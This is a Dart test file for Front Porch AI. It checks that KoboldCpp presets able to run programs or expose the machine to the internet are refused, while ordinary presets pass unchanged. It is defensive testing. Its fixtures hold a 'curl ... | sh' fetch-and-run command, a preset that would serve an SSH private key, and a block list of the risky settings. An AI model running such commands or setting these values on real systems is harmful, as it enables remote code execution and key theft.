// Copyright (C) 2026 Front Porch AI
// SPDX-License-Identifier: AGPL-3.0-or-later

// A preset is the user's file, run as written, with one exception: a preset
// that makes KoboldCpp run a program or open itself to the internet is
// refused, in plain words that name the settings.
//
// KoboldCpp applies these keys from the config it is started with, and from
// a live reload of one: `mcpfile` downloads a list of programs and starts
// them, `onready` runs a command, `remotetunnel` opens a public tunnel,
// `hordekey` lends the graphics card to strangers, `preloadstory` serves any
// file, `baseconfig` loads another config from anywhere, and `rpcmode: host`
// opens a network service. It reads each of them the way Python reads a
// value, so the text "false" is on.
//
// Nothing here starts an engine. The real service is asked to start and
// stops before it spawns anything, as in kobold_start_recovers_test.

import 'dart:convert';
import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:front_porch_ai/services/kobold/kobold.dart';
import 'package:front_porch_ai/services/kobold_admin_swap.dart';
import 'package:front_porch_ai/services/kobold_service.dart';
import 'package:front_porch_ai/services/storage_service.dart';
import 'package:path/path.dart' as p;

import '../kobold_service_test.dart'
    show createStorageService, setupPathProviderMock;

const _fixture = 'test/fixtures/kcpps/koboldcpp_1_117_1_export.kcpps';

/// Every setting the refusal is about, by the name KoboldCpp reads.
const _all = [
  'mcpfile',
  'onready',
  'remotetunnel',
  'hordekey',
  'preloadstory',
  'baseconfig',
  'rpcmode',
];

typedef _Hostile = ({
  String why,
  Map<String, dynamic> preset,
  List<String> keys,
});

final List<_Hostile> _hostile = [
  (
    why: 'a list of programs to download and run',
    preset: {'mcpfile': 'https://example.com/servers.json'},
    keys: ['mcpfile'],
  ),
  (
    why: 'a public tunnel switched on',
    preset: {'remotetunnel': true},
    keys: ['remotetunnel'],
  ),
  // Python reads any non-empty text as on, so this opens the tunnel.
  (
    why: 'a public tunnel written as the text "false"',
    preset: {'remotetunnel': 'false'},
    keys: ['remotetunnel'],
  ),
  (
    why: 'a public tunnel written as 1',
    preset: {'remotetunnel': 1},
    keys: ['remotetunnel'],
  ),
  (
    why: 'this computer as an RPC host',
    preset: {'rpcmode': 'host'},
    keys: ['rpcmode'],
  ),
  (
    why: 'a command to run when the model is ready',
    preset: {'onready': 'curl https://example.com/x | sh'},
    keys: ['onready'],
  ),
  // Older engines take it as a list.
  (
    why: 'a command to run, as a list',
    preset: {
      'onready': ['curl https://example.com/x | sh'],
    },
    keys: ['onready'],
  ),
  (
    why: 'a Horde key',
    preset: {'hordekey': 'abc123', 'hordeworkername': 'mine'},
    keys: ['hordekey'],
  ),
  (
    why: 'a file to serve to anyone who asks',
    preset: {'preloadstory': '/home/me/.ssh/id_ed25519'},
    keys: ['preloadstory'],
  ),
  (
    why: 'another config to load from anywhere',
    preset: {'baseconfig': '/tmp/other.kcpps'},
    keys: ['baseconfig'],
  ),
  (
    why: 'several at once, among ordinary settings',
    preset: {
      'contextsize': 8192,
      'mcpfile': 'https://example.com/servers.json',
      'remotetunnel': true,
      'rpcmode': 'host',
      'gpulayers': 20,
    },
    keys: ['mcpfile', 'remotetunnel', 'rpcmode'],
  ),
];

/// The refusal's words: it names exactly [keys] and says what to do.
Matcher _refusalFor(List<String> keys) => allOf([
  for (final key in _all)
    keys.contains(key) ? contains(key) : isNot(contains(key)),
  contains('run a program or open itself to the internet'),
  contains('pick another preset'),
]);

Map<String, dynamic> _launch(Map<String, dynamic> preset) =>
    kcppsPresetLaunchMap(preset, modelPath: '', mmprojPath: '');

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();
  setupPathProviderMock();

  late StorageService storage;
  late KoboldService kobold;
  late Directory dir;
  late String engine;
  late String model;

  setUp(() async {
    storage = await createStorageService();
    kobold = KoboldService(storage);
    dir = Directory.systemTemp.createTempSync('fpai_risky_');
    // Never created: nothing here gets as far as running it.
    engine = p.join(dir.path, 'koboldcpp');
    model = p.join(dir.path, 'model.gguf');
    File(model).writeAsBytesSync([...'GGUF'.codeUnits, 3, 0, 0, 0]);
    await storage.backendSettings.setLastUsedModelPath(model);
  });

  tearDown(() {
    kobold.dispose();
    final admin = koboldAdminDirFor(storage);
    if (FileSystemEntity.isFileSync(admin)) File(admin).deleteSync();
    dir.deleteSync(recursive: true);
  });

  /// [preset] written as a file and made chat's preset.
  Future<String> activate(Map<String, dynamic> preset) async {
    final file = File(p.join(dir.path, 'Theirs.kcpps'))
      ..writeAsStringSync(jsonEncode(preset));
    await storage.backendSettings.setActiveKcppsPath(file.path);
    return file.path;
  }

  group('a preset that runs a program or opens KoboldCpp to the internet', () {
    for (final h in _hostile) {
      test('${h.why}: the launch map refuses it, naming the settings', () {
        expect(
          () => _launch(h.preset),
          throwsA(
            isA<KoboldPresetProblem>().having(
              (e) => e.message,
              'message',
              _refusalFor(h.keys),
            ),
          ),
        );
      });

      test('${h.why}: Start is told before anything is stopped, in the same '
          'words', () async {
        await activate(h.preset);

        expect(await koboldLaunchProblem(storage), _refusalFor(h.keys));
      });
    }

    test('a real Start refuses it: nothing is staged for KoboldCpp and the '
        'next Start is not turned away', () async {
      await activate({
        'mcpfile': 'https://example.com/servers.json',
        'remotetunnel': true,
      });

      final result = await kobold.launch(
        engine,
        pickedModel: model,
        port: 5999,
      );

      expect(result.started, isFalse);
      expect(result.message, _refusalFor(['mcpfile', 'remotetunnel']));
      expect(
        File(
          p.join(koboldAdminDirFor(storage), kStagedChatConfig),
        ).existsSync(),
        isFalse,
        reason: 'the file KoboldCpp would have read was never written',
      );
      expect(kobold.isStarting, isFalse);
    });
  });

  group('everything else about a preset launches as written', () {
    test('a config saved by KoboldCpp 1.117.1 itself carries every one of '
        'these settings, switched off, and passes unchanged', () async {
      final text = File(_fixture).readAsStringSync();
      final raw = (readKcpps(text) as KcppsOk).raw;
      for (final key in _all) {
        expect(raw.containsKey(key), isTrue, reason: '$key is in the export');
      }

      final ready = _launch(raw);

      for (final key in raw.keys.toSet().difference({'jinja', 'noswa'})) {
        expect(ready[key], raw[key], reason: key);
      }
      File(p.join(dir.path, 'Theirs.kcpps')).writeAsStringSync(text);
      await storage.backendSettings.setActiveKcppsPath(
        p.join(dir.path, 'Theirs.kcpps'),
      );
      expect(await koboldLaunchProblem(storage), isNull);
    });

    test('every way KoboldCpp reads a value as off passes', () {
      for (final key in _all.where((k) => k != 'rpcmode')) {
        for (final off in <Object?>[null, false, 0, 0.0, '', <Object>[], {}]) {
          final preset = {key: off};
          expect(_launch(preset)[key], off, reason: '$key: $off');
        }
      }
    });

    test('rpcmode is refused only as host: connect and disabled pass', () {
      for (final mode in ['connect', 'disabled']) {
        expect(_launch({'rpcmode': mode})['rpcmode'], mode);
      }
    });

    test('the other settings that reach the engine are the user\'s, and are '
        'not touched', () async {
      final preset = <String, dynamic>{
        'host': '0.0.0.0',
        'password': 'secret',
        'ssl': ['cert.pem', 'key.pem'],
        'savedatafile': '/data/slots',
        'hordemodelname': 'mine',
        'cli': true,
      };
      await activate(preset);

      expect({..._launch(preset)}..remove('jinja'), preset);
      expect(await koboldLaunchProblem(storage), isNull);
    });
  });
}
